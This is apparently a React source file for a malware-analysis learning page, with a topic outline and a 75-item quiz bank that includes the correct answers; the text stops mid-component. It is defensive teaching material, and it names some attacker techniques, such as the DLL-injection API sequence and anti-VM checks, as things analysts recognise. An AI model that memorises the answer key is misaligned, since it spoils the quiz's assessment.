import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import { Link } from "react-router-dom";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  alpha,
  useTheme,
  Divider,
  Alert,
  AlertTitle,
  Tooltip,
  Fab,
  Drawer,
  LinearProgress,
  IconButton,
  useMediaQuery,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import BugReportIcon from "@mui/icons-material/BugReport";
import SecurityIcon from "@mui/icons-material/Security";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import SchoolIcon from "@mui/icons-material/School";
import TerminalIcon from "@mui/icons-material/Terminal";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SearchIcon from "@mui/icons-material/Search";
import VisibilityIcon from "@mui/icons-material/Visibility";
import StorageIcon from "@mui/icons-material/Storage";
import SettingsIcon from "@mui/icons-material/Settings";
import DeveloperBoardIcon from "@mui/icons-material/DeveloperBoard";
import LayersIcon from "@mui/icons-material/Layers";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import DataObjectIcon from "@mui/icons-material/DataObject";
import SpeedIcon from "@mui/icons-material/Speed";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import CloudIcon from "@mui/icons-material/Cloud";
import ShieldIcon from "@mui/icons-material/Shield";
import GavelIcon from "@mui/icons-material/Gavel";
import PsychologyIcon from "@mui/icons-material/Psychology";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import RadioButtonUncheckedIcon from "@mui/icons-material/RadioButtonUnchecked";
import LockIcon from "@mui/icons-material/Lock";
import MemoryIcon from "@mui/icons-material/Memory";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import FolderIcon from "@mui/icons-material/Folder";
import SyncAltIcon from "@mui/icons-material/SyncAlt";
import DescriptionIcon from "@mui/icons-material/Description";
import PolicyIcon from "@mui/icons-material/Policy";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import AnalyticsIcon from "@mui/icons-material/Analytics";
import TimelineIcon from "@mui/icons-material/Timeline";
import HubIcon from "@mui/icons-material/Hub";
import QuizIcon from "@mui/icons-material/Quiz";
import RefreshIcon from "@mui/icons-material/Refresh";
import EmojiEventsIcon from "@mui/icons-material/EmojiEvents";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import { useNavigate } from "react-router-dom";

// Outline sections for future expansion
const outlineSections = [
  {
    id: "malware-types",
    title: "Malware Types & Classification",
    icon: <BugReportIcon />,
    color: "#ef4444",
    status: "Complete",
    description: "Viruses, worms, trojans, ransomware, rootkits, spyware, and their characteristics",
  },
  {
    id: "analysis-environment",
    title: "Setting Up an Analysis Environment",
    icon: <SettingsIcon />,
    color: "#8b5cf6",
    status: "Complete",
    description: "Virtual machines, sandboxes, REMnux, FlareVM, network isolation, and snapshots",
  },
  {
    id: "static-analysis",
    title: "Static Analysis Fundamentals",
    icon: <SearchIcon />,
    color: "#3b82f6",
    status: "Complete",
    description: "File headers, strings extraction, PE/ELF analysis, imports/exports, and signatures",
  },
  {
    id: "dynamic-analysis",
    title: "Dynamic Analysis & Behavior Monitoring",
    icon: <PlayArrowIcon />,
    color: "#06b6d4",
    status: "Complete",
    description: "Process monitoring, API tracing, registry changes, file system activity, and network traffic",
  },
  {
    id: "debugging-malware",
    title: "Debugging Malware",
    icon: <BugReportIcon />,
    color: "#ec4899",
    status: "Complete",
    description: "x64dbg, OllyDbg, WinDbg, breakpoints, stepping through code, and memory inspection",
  },
  {
    id: "disassembly-analysis",
    title: "Disassembly & Code Analysis",
    icon: <CodeIcon />,
    color: "#14b8a6",
    status: "Complete",
    description: "IDA Pro, Ghidra, Binary Ninja, understanding assembly, and function identification",
  },
  {
    id: "anti-analysis",
    title: "Anti-Analysis Techniques",
    icon: <ShieldIcon />,
    color: "#f97316",
    status: "Complete",
    description: "Packers, crypters, obfuscation, anti-debugging, anti-VM, and evasion techniques",
  },
  {
    id: "unpacking",
    title: "Unpacking & Deobfuscation",
    icon: <LockIcon />,
    color: "#6366f1",
    status: "Complete",
    description: "Manual unpacking, UPX, custom packers, dumping process memory, and IAT reconstruction",
  },
  {
    id: "network-analysis",
    title: "Network Traffic Analysis",
    icon: <NetworkCheckIcon />,
    color: "#0ea5e9",
    status: "Complete",
    description: "Wireshark, FakeNet-NG, INetSim, C2 protocol analysis, and DNS monitoring",
  },
  {
    id: "memory-forensics",
    title: "Memory Forensics",
    icon: <MemoryIcon />,
    color: "#dc2626",
    status: "Complete",
    description: "Volatility, process injection detection, hidden processes, and memory dumps",
  },
  {
    id: "yara-rules",
    title: "YARA Rules & Signature Writing",
    icon: <PolicyIcon />,
    color: "#22c55e",
    status: "Complete",
    description: "Writing YARA rules, pattern matching, malware hunting, and automated detection",
  },
  {
    id: "ransomware-analysis",
    title: "Ransomware Analysis",
    icon: <VpnKeyIcon />,
    color: "#f97316",
    status: "Complete",
    description: "Encryption routines, key extraction, ransom notes, and recovery possibilities",
  },
  {
    id: "c2-infrastructure",
    title: "C2 Infrastructure Analysis",
    icon: <HubIcon />,
    color: "#8b5cf6",
    status: "Complete",
    description: "Command & control protocols, DGA analysis, beaconing patterns, and infrastructure mapping",
  },
  {
    id: "threat-intel",
    title: "Threat Intelligence Integration",
    icon: <AnalyticsIcon />,
    color: "#3b82f6",
    status: "Complete",
    description: "IOCs, VirusTotal, MISP, threat sharing, attribution, and APT tracking",
  },
  {
    id: "reporting",
    title: "Malware Analysis Reporting",
    icon: <DescriptionIcon />,
    color: "#10b981",
    status: "Complete",
    description: "Writing analysis reports, IOC documentation, MITRE ATT&CK mapping, and disclosure",
  },
];

// Quick stats for visual impact
const quickStats = [
  { value: "15", label: "Topics Covered", color: "#ef4444" },
  { value: "PE/ELF", label: "Binary Formats", color: "#3b82f6" },
  { value: "2", label: "Analysis Types", color: "#10b981" },
  { value: "Lab", label: "Isolated Environment", color: "#8b5cf6" },
];

// Question bank for the quiz (75 questions)
interface QuizQuestion {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
  topic: string;
}

const questionBank: QuizQuestion[] = [
  {
    id: 1,
    question: "What is the primary goal of malware analysis?",
    options: [
      "Write exploit code",
      "Understand behavior and produce actionable findings",
      "Recover deleted files",
      "Optimize system performance",
    ],
    correctAnswer: 1,
    explanation: "Analysis focuses on understanding behavior, impact, and defensive actions.",
    topic: "Fundamentals",
  },
  {
    id: 2,
    question: "Static analysis means:",
    options: [
      "Running the malware in a VM",
      "Inspecting the file without executing it",
      "Capturing network traffic only",
      "Changing registry keys",
    ],
    correctAnswer: 1,
    explanation: "Static analysis examines the binary without running it.",
    topic: "Fundamentals",
  },
  {
    id: 3,
    question: "IOC stands for:",
    options: ["Indicator of Compromise", "Instruction of Code", "Index of Crypto", "Internal OS Control"],
    correctAnswer: 0,
    explanation: "IOCs are artifacts that indicate a system may be compromised.",
    topic: "Fundamentals",
  },
  {
    id: 4,
    question: "Packers are often used to:",
    options: [
      "Increase file size for backups",
      "Compress or obfuscate malware to evade analysis",
      "Improve code readability",
      "Enable digital signing",
    ],
    correctAnswer: 1,
    explanation: "Packing hides code and makes analysis harder.",
    topic: "Fundamentals",
  },
  {
    id: 5,
    question: "A sandbox is best described as:",
    options: [
      "A backup disk",
      "An isolated environment for safe execution",
      "A registry editor",
      "A hex editor",
    ],
    correctAnswer: 1,
    explanation: "Sandboxes isolate malware to reduce risk while observing behavior.",
    topic: "Fundamentals",
  },
  {
    id: 6,
    question: "Triage in malware analysis refers to:",
    options: [
      "Writing full reports",
      "Quickly categorizing and prioritizing samples",
      "Deleting infected files",
      "Rebuilding binaries",
    ],
    correctAnswer: 1,
    explanation: "Triage is a fast first pass to decide next steps.",
    topic: "Fundamentals",
  },
  {
    id: 7,
    question: "Which hash is preferred for modern malware tracking?",
    options: ["MD5", "SHA-256", "CRC32", "NTLM"],
    correctAnswer: 1,
    explanation: "SHA-256 is more collision-resistant than MD5.",
    topic: "Fundamentals",
  },
  {
    id: 8,
    question: "The PE format is most commonly associated with:",
    options: ["Linux", "Windows", "macOS", "Android"],
    correctAnswer: 1,
    explanation: "PE (Portable Executable) is the Windows executable format.",
    topic: "Fundamentals",
  },
  {
    id: 9,
    question: "C2 stands for:",
    options: ["Control and Command", "Command and Control", "Capture and Contain", "Code and Compile"],
    correctAnswer: 1,
    explanation: "C2 refers to attacker infrastructure that controls malware.",
    topic: "Fundamentals",
  },
  {
    id: 10,
    question: "YARA is primarily used to:",
    options: [
      "Capture packets",
      "Write detection rules based on patterns",
      "Manage virtual machines",
      "Compile binaries",
    ],
    correctAnswer: 1,
    explanation: "YARA rules match byte patterns and strings to detect malware.",
    topic: "Fundamentals",
  },
  {
    id: 11,
    question: "Why are VM snapshots important in malware labs?",
    options: [
      "They increase CPU speed",
      "They allow quick rollback to a clean state",
      "They disable antivirus",
      "They update drivers",
    ],
    correctAnswer: 1,
    explanation: "Snapshots let you revert after infection or changes.",
    topic: "Lab Setup",
  },
  {
    id: 12,
    question: "A safe network setup for malware analysis is usually:",
    options: [
      "Direct internet access",
      "Host-only or NAT with controlled services",
      "Public Wi-Fi",
      "Bluetooth tethering",
    ],
    correctAnswer: 1,
    explanation: "Controlled networks reduce risk while allowing observation.",
    topic: "Lab Setup",
  },
  {
    id: 13,
    question: "REMnux is best described as:",
    options: [
      "A Windows debugger",
      "A Linux distro for malware analysis",
      "A browser extension",
      "A packet injector",
    ],
    correctAnswer: 1,
    explanation: "REMnux is a Linux toolkit for malware and network analysis.",
    topic: "Lab Setup",
  },
  {
    id: 14,
    question: "FLARE-VM is:",
    options: [
      "A Windows malware analysis environment",
      "A packet sniffer",
      "A Linux kernel module",
      "A ransomware decryptor",
    ],
    correctAnswer: 0,
    explanation: "FLARE-VM provides Windows tools for reverse engineering and analysis.",
    topic: "Lab Setup",
  },
  {
    id: 15,
    question: "Best practice for storing malware samples is:",
    options: [
      "Uncompressed on the desktop",
      "Password-protected archives with clear labels",
      "In shared folders with the host",
      "In email attachments",
    ],
    correctAnswer: 1,
    explanation: "Encrypted, labeled storage reduces accidental execution.",
    topic: "Lab Setup",
  },
  {
    id: 16,
    question: "Why disable shared clipboard or folders in a malware VM?",
    options: [
      "It improves graphics performance",
      "It reduces risk of host contamination",
      "It speeds up analysis",
      "It enables root access",
    ],
    correctAnswer: 1,
    explanation: "Shared features can leak malware to the host system.",
    topic: "Lab Setup",
  },
  {
    id: 17,
    question: "INetSim or FakeNet-NG are used to:",
    options: [
      "Simulate network services safely",
      "Encrypt disks",
      "Scan Wi-Fi",
      "Compile drivers",
    ],
    correctAnswer: 0,
    explanation: "They emulate network services for observing malware behavior.",
    topic: "Lab Setup",
  },
  {
    id: 18,
    question: "Should you analyze malware directly on your host machine?",
    options: ["Yes, for performance", "Only if signed", "No, use isolation", "Only on weekends"],
    correctAnswer: 2,
    explanation: "Always analyze untrusted samples in isolated environments.",
    topic: "Lab Setup",
  },
  {
    id: 19,
    question: "Why change the VM system clock during analysis?",
    options: [
      "To improve graphics",
      "To bypass time-based evasion or delays",
      "To update Windows",
      "To reset the registry",
    ],
    correctAnswer: 1,
    explanation: "Some malware sleeps or waits for specific dates.",
    topic: "Lab Setup",
  },
  {
    id: 20,
    question: "After running a sample, you should usually:",
    options: [
      "Keep the VM running",
      "Revert to a clean snapshot",
      "Disable logging",
      "Copy files to the host",
    ],
    correctAnswer: 1,
    explanation: "Reverting removes any hidden persistence or artifacts.",
    topic: "Lab Setup",
  },
  {
    id: 21,
    question: "Strings analysis is useful because it can reveal:",
    options: ["UI colors", "Hardcoded URLs and file paths", "CPU temperature", "BIOS settings"],
    correctAnswer: 1,
    explanation: "Strings often contain indicators like domains or commands.",
    topic: "Static Analysis",
  },
  {
    id: 22,
    question: "The import table helps you understand:",
    options: ["Compiler version only", "APIs and libraries the binary uses", "Disk usage", "User accounts"],
    correctAnswer: 1,
    explanation: "Imports show external functions that hint at behavior.",
    topic: "Static Analysis",
  },
  {
    id: 23,
    question: "High entropy in a file often suggests:",
    options: ["Plain text", "Packing or encryption", "Debug symbols", "Low complexity"],
    correctAnswer: 1,
    explanation: "Compressed or encrypted data increases entropy.",
    topic: "Static Analysis",
  },
  {
    id: 24,
    question: "Which PE section usually contains executable code?",
    options: [".rsrc", ".text", ".data", ".reloc"],
    correctAnswer: 1,
    explanation: "The .text section typically holds executable instructions.",
    topic: "Static Analysis",
  },
  {
    id: 25,
    question: "A valid digital signature indicates:",
    options: [
      "The file is always safe",
      "The file matches the signer and has not been modified",
      "The file is encrypted",
      "The file is packed",
    ],
    correctAnswer: 1,
    explanation: "Signatures show integrity and publisher, but not safety.",
    topic: "Static Analysis",
  },
  {
    id: 26,
    question: "A PDB path in a binary can reveal:",
    options: ["Compiler flags", "Build environment and project paths", "Network routes", "Encryption keys"],
    correctAnswer: 1,
    explanation: "PDB paths often expose developer file paths or names.",
    topic: "Static Analysis",
  },
  {
    id: 27,
    question: "The Rich header is associated with:",
    options: ["Linux ELF metadata", "MSVC toolchain metadata in PE files", "macOS signing", "Android manifests"],
    correctAnswer: 1,
    explanation: "Rich headers contain MSVC build metadata.",
    topic: "Static Analysis",
  },
  {
    id: 28,
    question: "ELF is most common on:",
    options: ["Windows", "Linux", "iOS", "Nintendo Switch"],
    correctAnswer: 1,
    explanation: "ELF is the standard executable format on Linux/Unix.",
    topic: "Static Analysis",
  },
  {
    id: 29,
    question: "A small import table with lots of code can hint at:",
    options: ["Packing", "Open source code", "Low privileges", "Signed binaries"],
    correctAnswer: 0,
    explanation: "Packed samples hide imports and resolve APIs at runtime.",
    topic: "Static Analysis",
  },
  {
    id: 30,
    question: "If a file hash changes, it usually means:",
    options: ["The file is identical", "The file content differs", "The file was signed", "The file is clean"],
    correctAnswer: 1,
    explanation: "Even small changes alter cryptographic hashes.",
    topic: "Static Analysis",
  },
  {
    id: 31,
    question: "Which tool is commonly used to track file, registry, and process activity?",
    options: ["Wireshark", "Procmon", "IDAPython", "Ghidra"],
    correctAnswer: 1,
    explanation: "Procmon captures file, registry, and process events.",
    topic: "Dynamic Analysis",
  },
  {
    id: 32,
    question: "Packet capture during analysis is commonly done with:",
    options: ["Wireshark", "Regshot", "PE-bear", "Hashcat"],
    correctAnswer: 0,
    explanation: "Wireshark is a standard packet capture tool.",
    topic: "Dynamic Analysis",
  },
  {
    id: 33,
    question: "A persistence mechanism often involves:",
    options: ["Temporary files only", "Registry Run keys or scheduled tasks", "Only RAM usage", "No disk changes"],
    correctAnswer: 1,
    explanation: "Persistence commonly uses registry or scheduled tasks.",
    topic: "Dynamic Analysis",
  },
  {
    id: 34,
    question: "Which API combination is a classic indicator of DLL injection?",
    options: [
      "CreateFile + ReadFile",
      "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",
      "RegOpenKey + RegSetValue",
      "GetTickCount + Sleep",
    ],
    correctAnswer: 1,
    explanation: "That sequence indicates remote process injection.",
    topic: "Dynamic Analysis",
  },
  {
    id: 35,
    question: "API tracing is useful because it:",
    options: [
      "Shows high-level behavior through function calls",
      "Only shows network packets",
      "Replaces disassembly",
      "Disables packing",
    ],
    correctAnswer: 0,
    explanation: "Tracing APIs reveals behavior without reverse engineering everything.",
    topic: "Dynamic Analysis",
  },
  {
    id: 36,
    question: "FakeNet-NG helps by:",
    options: [
      "Updating antivirus",
      "Simulating DNS/HTTP/SMTP services for observation",
      "Encrypting traffic",
      "Removing malware",
    ],
    correctAnswer: 1,
    explanation: "FakeNet-NG emulates network services to capture behavior.",
    topic: "Dynamic Analysis",
  },
  {
    id: 37,
    question: "A mutex created by malware often indicates:",
    options: ["Single-instance enforcement", "Disk cleanup", "System updates", "User login"],
    correctAnswer: 0,
    explanation: "Mutexes prevent multiple instances from running.",
    topic: "Dynamic Analysis",
  },
  {
    id: 38,
    question: "If malware sleeps for long periods, analysts often:",
    options: [
      "Wait indefinitely",
      "Patch or skip delays with a debugger",
      "Reinstall the OS",
      "Disable the network",
    ],
    correctAnswer: 1,
    explanation: "You can bypass delays by patching or changing time APIs.",
    topic: "Dynamic Analysis",
  },
  {
    id: 39,
    question: "Memory dumps are useful because they can reveal:",
    options: ["Unpacked code and decrypted strings", "BIOS settings", "CPU voltage", "Router configs"],
    correctAnswer: 0,
    explanation: "Runtime memory often contains unpacked payloads.",
    topic: "Dynamic Analysis",
  },
  {
    id: 40,
    question: "Sysmon is often used to:",
    options: ["Defragment disks", "Collect detailed host telemetry", "Compile code", "Encrypt samples"],
    correctAnswer: 1,
    explanation: "Sysmon logs process, network, and file activity.",
    topic: "Dynamic Analysis",
  },
  {
    id: 41,
    question: "A breakpoint allows you to:",
    options: ["Pause execution at a chosen instruction", "Encrypt files", "Change CPU architecture", "Delete code"],
    correctAnswer: 0,
    explanation: "Breakpoints stop execution so you can inspect state.",
    topic: "Debugging",
  },
  {
    id: 42,
    question: "Step over vs step into means:",
    options: [
      "Step over runs a call; step into enters it",
      "Step over deletes code; step into saves files",
      "Step over changes colors; step into changes fonts",
      "They do the same thing",
    ],
    correctAnswer: 0,
    explanation: "Step into enters a function call; step over executes it without entering.",
    topic: "Debugging",
  },
  {
    id: 43,
    question: "IDA Pro and Ghidra are primarily used for:",
    options: ["Disassembly and decompilation", "Packet capture", "Password cracking", "Network scanning"],
    correctAnswer: 0,
    explanation: "They help analyze binaries at the code level.",
    topic: "Debugging",
  },
  {
    id: 44,
    question: "x64dbg is:",
    options: ["A Windows debugger", "A Linux kernel module", "A registry editor", "A file packer"],
    correctAnswer: 0,
    explanation: "x64dbg is a popular Windows user-mode debugger.",
    topic: "Debugging",
  },
  {
    id: 45,
    question: "Hardware breakpoints are useful because they:",
    options: [
      "Do not modify code bytes",
      "Compress binaries",
      "Disable anti-debugging",
      "Increase file size",
    ],
    correctAnswer: 0,
    explanation: "Hardware breakpoints avoid changing instruction bytes.",
    topic: "Debugging",
  },
  {
    id: 46,
    question: "API hooking is often used to:",
    options: ["Log or alter function calls at runtime", "Compile code", "Encrypt traffic", "Move files"],
    correctAnswer: 0,
    explanation: "Hooking intercepts calls for monitoring or modification.",
    topic: "Debugging",
  },
  {
    id: 47,
    question: "A stack trace helps you:",
    options: ["See the call chain leading to the current point", "List disk partitions", "Create new functions", "Delete registry keys"],
    correctAnswer: 0,
    explanation: "Stack traces show function call history.",
    topic: "Debugging",
  },
  {
    id: 48,
    question: "IAT reconstruction is typically needed after:",
    options: ["Unpacking packed malware", "Writing YARA rules", "Capturing packets", "Updating signatures"],
    correctAnswer: 0,
    explanation: "Packed binaries often need import tables rebuilt.",
    topic: "Debugging",
  },
  {
    id: 49,
    question: "A basic block is:",
    options: [
      "A straight-line sequence of instructions with single entry and exit",
      "A compressed section",
      "A memory page",
      "A registry hive",
    ],
    correctAnswer: 0,
    explanation: "Basic blocks are linear instruction sequences.",
    topic: "Debugging",
  },
  {
    id: 50,
    question: "A function prologue typically:",
    options: ["Sets up the stack frame", "Deletes memory", "Encrypts strings", "Exports symbols"],
    correctAnswer: 0,
    explanation: "Prologues prepare stack space and save registers.",
    topic: "Debugging",
  },
  {
    id: 51,
    question: "Anti-VM checks might look for:",
    options: ["VMware tools or registry keys", "High RAM usage", "User documents", "Open ports only"],
    correctAnswer: 0,
    explanation: "Malware checks VM artifacts to evade analysis.",
    topic: "Anti-Analysis",
  },
  {
    id: 52,
    question: "IsDebuggerPresent is used to:",
    options: ["Detect a debugger", "Load drivers", "Create sockets", "Encrypt strings"],
    correctAnswer: 0,
    explanation: "This API flags when a debugger is attached.",
    topic: "Anti-Analysis",
  },
  {
    id: 53,
    question: "A common packing indicator is:",
    options: ["High entropy and few imports", "Large symbol tables", "Many debug strings", "Low file size only"],
    correctAnswer: 0,
    explanation: "Packed files compress or encrypt code and reduce imports.",
    topic: "Anti-Analysis",
  },
  {
    id: 54,
    question: "A typical unpacking step is to:",
    options: ["Dump the process after unpacking occurs", "Recompile the binary", "Disable the OS", "Patch the bootloader"],
    correctAnswer: 0,
    explanation: "Dumping memory captures the unpacked payload.",
    topic: "Anti-Analysis",
  },
  {
    id: 55,
    question: "OEP stands for:",
    options: ["Original Entry Point", "Open Execution Path", "Output Export Program", "Operational Endpoint"],
    correctAnswer: 0,
    explanation: "OEP is the original entry point after unpacking.",
    topic: "Anti-Analysis",
  },
  {
    id: 56,
    question: "Scylla is commonly used to:",
    options: ["Rebuild import tables", "Capture packets", "Scan Wi-Fi", "Compile exploits"],
    correctAnswer: 0,
    explanation: "Scylla helps fix IAT after unpacking.",
    topic: "Anti-Analysis",
  },
  {
    id: 57,
    question: "Self-modifying code means:",
    options: ["The program changes its own instructions at runtime", "The program updates itself via Windows Update", "The program edits documents", "The program only reads files"],
    correctAnswer: 0,
    explanation: "Self-modifying code alters instructions to evade analysis.",
    topic: "Anti-Analysis",
  },
  {
    id: 58,
    question: "TLS callbacks are notable because they:",
    options: [
      "Execute before the main entry point",
      "Only handle network traffic",
      "Run after program exit",
      "Encrypt files automatically",
    ],
    correctAnswer: 0,
    explanation: "TLS callbacks can run code before the normal entry point.",
    topic: "Anti-Analysis",
  },
  {
    id: 59,
    question: "Some malware waits for user interaction to:",
    options: ["Evade automated sandboxes", "Improve UI performance", "Install updates", "Boost CPU speed"],
    correctAnswer: 0,
    explanation: "User interaction checks help detect sandboxes.",
    topic: "Anti-Analysis",
  },
  {
    id: 60,
    question: "Breakpoints on VirtualAlloc or WriteProcessMemory can help detect:",
    options: ["Unpacking or injection activity", "Disk encryption", "User logins", "Audio playback"],
    correctAnswer: 0,
    explanation: "These APIs are used for unpacking or injection.",
    topic: "Anti-Analysis",
  },
  {
    id: 61,
    question: "Regular, timed outbound connections often indicate:",
    options: ["Beaconing to C2", "Normal OS updates", "Printer activity", "DNS misconfiguration"],
    correctAnswer: 0,
    explanation: "Beaconing is a common C2 communication pattern.",
    topic: "Network & Intel",
  },
  {
    id: 62,
    question: "DGA stands for:",
    options: ["Domain Generation Algorithm", "Data Group Analysis", "Dynamic Gateway Access", "Direct Graph Assignment"],
    correctAnswer: 0,
    explanation: "DGAs create many domains to evade blocking.",
    topic: "Network & Intel",
  },
  {
    id: 63,
    question: "Which is an example of an IOC?",
    options: ["SHA-256 hash", "CPU usage", "Monitor resolution", "Keyboard layout only"],
    correctAnswer: 0,
    explanation: "Hashes, domains, IPs, and file paths are common IOCs.",
    topic: "Network & Intel",
  },
  {
    id: 64,
    question: "A YARA rule is composed of:",
    options: ["Strings and a condition", "Packets and ports", "Users and groups", "Files and folders"],
    correctAnswer: 0,
    explanation: "YARA uses strings and boolean conditions to match.",
    topic: "Network & Intel",
  },
  {
    id: 65,
    question: "MITRE ATT&CK is used to:",
    options: ["Map behaviors to known tactics and techniques", "Encrypt traffic", "Generate hashes", "Block USB devices"],
    correctAnswer: 0,
    explanation: "ATT&CK provides a common language for adversary behaviors.",
    topic: "Network & Intel",
  },
  {
    id: 66,
    question: "Threat intelligence sources often include:",
    options: ["VirusTotal and MISP", "Windows Update", "Game launchers", "Printer queues"],
    correctAnswer: 0,
    explanation: "These platforms share samples and indicators.",
    topic: "Network & Intel",
  },
  {
    id: 67,
    question: "A strong malware report should include:",
    options: [
      "IOCs, behavior summary, and TTP mapping",
      "Only the file name",
      "Only screenshots",
      "Only decompiler output",
    ],
    correctAnswer: 0,
    explanation: "Reports should be actionable for defenders.",
    topic: "Reporting",
  },
  {
    id: 68,
    question: "Why is attribution risky in malware reports?",
    options: [
      "It is always illegal",
      "Attribution can be uncertain and mislead defenders",
      "It is required by law",
      "It makes analysis faster",
    ],
    correctAnswer: 1,
    explanation: "Attribution is hard and often inconclusive.",
    topic: "Reporting",
  },
  {
    id: 69,
    question: "Encrypted traffic analysis can still use:",
    options: ["Metadata like SNI or JA3", "Only plaintext payloads", "CPU temperatures", "Disk labels"],
    correctAnswer: 0,
    explanation: "Metadata can reveal useful patterns even with encryption.",
    topic: "Network & Intel",
  },
  {
    id: 70,
    question: "Why combine sandboxing with manual analysis?",
    options: [
      "Sandboxes are slow",
      "Sandboxes give quick overview; manual analysis adds depth",
      "Manual analysis is always faster",
      "Sandboxing prevents any analysis",
    ],
    correctAnswer: 1,
    explanation: "Both methods complement each other.",
    topic: "Reporting",
  },
  {
    id: 71,
    question: "Ransomware analysis focuses heavily on:",
    options: ["Encryption routine and key handling", "Printer drivers", "Font settings", "Battery usage"],
    correctAnswer: 0,
    explanation: "Understanding encryption is key to recovery efforts.",
    topic: "Reporting",
  },
  {
    id: 72,
    question: "A common memory forensics tool is:",
    options: ["Volatility", "Nmap", "Burp Suite", "JADX"],
    correctAnswer: 0,
    explanation: "Volatility is widely used for memory analysis.",
    topic: "Network & Intel",
  },
  {
    id: 73,
    question: "To reduce YARA false positives, you should:",
    options: ["Use specific strings and strong conditions", "Match only short strings", "Use no conditions", "Avoid offsets"],
    correctAnswer: 0,
    explanation: "Specific, contextual rules reduce false matches.",
    topic: "Reporting",
  },
  {
    id: 74,
    question: "Sharing malware samples should be:",
    options: ["Only through authorized channels", "Publicly posted", "Shared over email without encryption", "Stored on USB and handed out"],
    correctAnswer: 0,
    explanation: "Sample sharing should follow policy and legal guidelines.",
    topic: "Reporting",
  },
  {
    id: 75,
    question: "After analysis, a good defensive step is to:",
    options: ["Publish IOCs and detection signatures", "Delete all logs", "Disable monitoring", "Ignore the findings"],
    correctAnswer: 0,
    explanation: "Sharing indicators helps defenders detect and respond.",
    topic: "Reporting",
  },
];

// Quiz Section Component
function QuizSection() {
  const theme = useTheme();
  const [quizStarted, setQuizStarted] = React.useState(false);
  const [currentQuestions, setCurrentQuestions] = React.useState<QuizQuestion[]>([]);
  const [userAnswers, setUserAnswers] = React.useState<{ [key: number]: number }>({});
  const [showResults, setShowResults] = React.useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = React.useState(0);

  const shuffleAndSelectQuestions = () => {
    const shuffled = [...questionBank].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, 10);
  };

  const startQuiz = () => {
    setCurrentQuestions(shuffleAndSelectQuestions());
    setUserAnswers({});
    setShowResults(false);
    setCurrentQuestionIndex(0);
    setQuizStarted(true);
  };

  const handleAnswerSelect = (questionId: number, answerIndex: number) => {
    setUserAnswers((prev) => ({ ...prev, [questionId]: answerIndex }));
  };

  const calculateScore = () => {
    let correct = 0;
    currentQuestions.forEach((q) => {
      if (userAnswers[q.id] === q.correctAnswer) correct++;
    });
    return correct;
  };

  const getScoreColor = (score: number) => {
    if (score >= 8) return "#22c55e";
    if (score >= 6) return "#f97316";
    return "#ef4444";
  };

  const getScoreMessage = (score: number) => {
    if (score === 10) return "Perfect score. You are ready for advanced analysis.";
    if (score >= 8) return "Excellent work. You have strong malware analysis fundamentals.";
    if (score >= 6) return "Good job. Review weak areas and try again.";
    if (score >= 4) return "Keep practicing. Revisit the core sections above.";
    return "Review the guide and try again. You will improve quickly.";
  };

  if (!quizStarted) {
    return (
      <Paper
        id="quiz-section"
        sx={{
          p: 4,
          mb: 5,
          borderRadius: 4,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
          border: `2px solid ${alpha("#ef4444", 0.3)}`,
          background: `linear-gradient(135deg, ${alpha("#ef4444", 0.05)} 0%, ${alpha("#f97316", 0.05)} 100%)`,
        }}
      >
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
          <Box
            sx={{
              width: 56,
              height: 56,
              borderRadius: 2,
              background: "linear-gradient(135deg, #ef4444, #f97316)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <QuizIcon sx={{ color: "white", fontSize: 32 }} />
          </Box>
          Malware Analysis Quiz
        </Typography>

        <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8, fontSize: "1.05rem" }}>
          Ready to test what you learned? Take this <strong>10-question quiz</strong> covering malware analysis
          fundamentals. Questions are randomly selected from a pool of <strong>75 questions</strong>, so each
          attempt is different.
        </Typography>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#ef4444", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#ef4444" }}>10</Typography>
              <Typography variant="caption" color="text.secondary">Questions</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#f97316", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#f97316" }}>75</Typography>
              <Typography variant="caption" color="text.secondary">Question Pool</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#3b82f6", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#3b82f6" }}>8</Typography>
              <Typography variant="caption" color="text.secondary">Topics Covered</Typography>
            </Paper>
          </Grid>
          <Grid item xs={6} sm={3}>
            <Paper sx={{ p: 2, textAlign: "center", bgcolor: alpha("#22c55e", 0.1), borderRadius: 2 }}>
              <Typography variant="h4" sx={{ fontWeight: 800, color: "#22c55e" }}>Unlimited</Typography>
              <Typography variant="caption" color="text.secondary">Retakes</Typography>
            </Paper>
          </Grid>
        </Grid>

        <Button
          variant="contained"
          size="large"
          onClick={startQuiz}
          startIcon={<QuizIcon />}
          sx={{
            background: "linear-gradient(135deg, #ef4444, #f97316)",
            fontWeight: 700,
            px: 4,
